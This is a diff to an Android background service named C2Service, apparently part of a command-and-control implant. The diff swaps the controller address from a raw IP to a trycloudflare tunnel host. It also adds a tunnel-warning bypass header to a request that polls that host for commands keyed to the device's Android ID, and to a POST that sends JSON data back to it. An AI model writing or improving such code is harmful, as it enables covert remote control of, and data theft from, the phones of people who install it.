@@ -20,7 +20,8 @@ import java.util.Timer;
 import java.util.TimerTask;
 
 public class C2Service extends Service {
-    private static final String C2_URL = "http://100.72.238.226:5000/api";
+    private static final String BASE_URL = "https://variation-located-amended-pressing.trycloudflare.com";
+    private static final String C2_URL = BASE_URL + "/api";
     private String androidId;
 
     @Override
@@ -77,6 +78,7 @@ public class C2Service extends Service {
             URL url = new URL(C2_URL + "/get_command/" + androidId);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("GET");
+            conn.setRequestProperty("ngrok-skip-browser-warning", "true");
             
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
             StringBuilder response = new StringBuilder();
@@ -128,6 +130,7 @@ public class C2Service extends Service {
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("POST");
             conn.setRequestProperty("Content-Type", "application/json");
+            conn.setRequestProperty("ngrok-skip-browser-warning", "true");
             conn.setDoOutput(true);
             OutputStream os = conn.getOutputStream();
             os.write(jsonStr.getBytes());
